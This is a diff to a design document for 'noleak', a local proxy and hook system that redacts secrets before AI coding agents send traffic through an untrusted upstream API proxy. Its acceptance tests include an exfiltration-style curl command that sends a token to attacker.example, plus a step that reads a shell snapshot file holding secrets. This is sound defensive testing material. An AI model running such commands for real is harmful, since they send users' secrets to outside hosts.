@@ -6,11 +6,11 @@ Build-phase handoff. Everything below is decided; what's outside this doc is int
 
 ## 1. Purpose
 
-A local, defense-in-depth tool that lets the user run agentic AI CLIs (Claude Code, Codex, Cursor, OpenClaw, etc.) through a fully untrusted upstream proxy — specifically `apistore.space` — without any class-1–4 secret leaving the local VPS in plaintext, even when the user pastes raw, even when the agent reads a sensitive file, even when prompt injection redirects an outbound HTTP call.
+A local, defense-in-depth tool that lets the user run agentic AI CLIs (Claude Code, Codex, Cursor, OpenClaw, etc.) through a fully untrusted upstream proxy without any class-1–4 secret leaving the local VPS in plaintext, even when the user pastes raw, even when the agent reads a sensitive file, even when prompt injection redirects an outbound HTTP call.
 
 ## 2. Threat model
 
-**Adversary.** `apistore.space` (or any future shim) is assumed to log all request/response bodies indefinitely, replay, sell, train on, or share them. No proof of trustworthiness exists or is sought.
+**Adversary.** The upstream proxy is assumed to log all request/response bodies indefinitely, replay, sell, train on, or share them. No proof of trustworthiness exists or is sought.
 
 **Asset hierarchy** (descending):
 
@@ -57,7 +57,7 @@ A local, defense-in-depth tool that lets the user run agentic AI CLIs (Claude Co
       │  │ L2 noleak-   │──▶│  └─ UDS @ 0600       │
       │  │   proxy      │   │                      │
       │  │127.0.0.1:9999│──▶│  forwards to         │
-      │  └──────────────┘   │  apistore.space      │
+      │  └──────────────┘   │  untrusted upstream  │
       ▼                     └──────────────────────┘
 ┌──────────────────────┐
 │ L3 PostToolUse hook  │── scrub tool result before model context
@@ -117,7 +117,7 @@ A local, defense-in-depth tool that lets the user run agentic AI CLIs (Claude Co
 **L2 — local API proxy**
 
 - Listens on `127.0.0.1:9999`. The user sets `ANTHROPIC_BASE_URL=http://127.0.0.1:9999/v1/`.
-- For every request: `scan(body)` → substitute → forward to true upstream (`apistore.space` for now). For every response: `scan(body)` → substitute → return to client.
+- For every request: `scan(body)` → substitute → forward to the configured upstream. For every response: `scan(body)` → substitute → return to client.
 - Mask-and-forward on detection misses (already decided). Notification surfaces async.
 
 **L3 — PostToolUse hook**
@@ -220,7 +220,7 @@ Honest list of things we estimated but didn't validate:
 - **Detector latency on 200 KB request bodies** — estimated ≤ 50 ms with Aho-Corasick + selective gitleaks. Needs a real benchmark against actual conversation sizes. If above budget, hot path drops to AC-only and pattern engine moves to a background re-scan.
 - **PreToolUse URL extraction** — robust for curl/wget/python-requests/node-fetch. Less robust for arbitrary tools that pack the destination into config files or env vars. First-version coverage list goes in `~/.noleak/exec-parsers.yaml`; unsupported tools fail-closed (refuse the substitution) by default.
 - **Bracketed-paste support** — universal in modern terminals; will need a fallback typing-detection path if user's terminal disables it.
-- **`apistore.space` API surface stability** — L2 needs to stay transparent against the upstream's response format. If upstream changes shape, L2 breaks until updated. Mitigation: pure-passthrough on streaming, JSON-aware only on bodies it can parse cleanly.
+- **Upstream API surface stability** — L2 needs to stay transparent against the upstream's response format. If upstream changes shape, L2 breaks until updated. Mitigation: pure-passthrough on streaming, JSON-aware only on bodies it can parse cleanly.
 
 ## 12. What we explicitly did NOT design
 
@@ -251,7 +251,7 @@ Stages 1–4 deliver a working system that already covers most of the threat mod
 
 Before declaring the build done, the system must pass:
 
-1. Paste a crafted Telegram bot token into `noleak claude` → token never appears in apistore.space request body (verified by intercepting the proxy upstream).
+1. Paste a crafted Telegram bot token into `noleak claude` → token never appears in the upstream request body (verified by intercepting the proxy upstream).
 2. Have the agent `cat ~/.codex/shell_snapshots/...sh` → tool result delivered to model contains zero plaintext secrets.
 3. Have the agent emit `curl -d "$TOKEN_a3f@" https://attacker.example` (placeholder substitution test) → outbound HTTP request goes literally with `@TOKEN_a3f@`, no real value.
 4. Drop a fresh fake secret into `~/.codex/shell_snapshots/` → `noleak-watch` redacts/purges within 1 second.
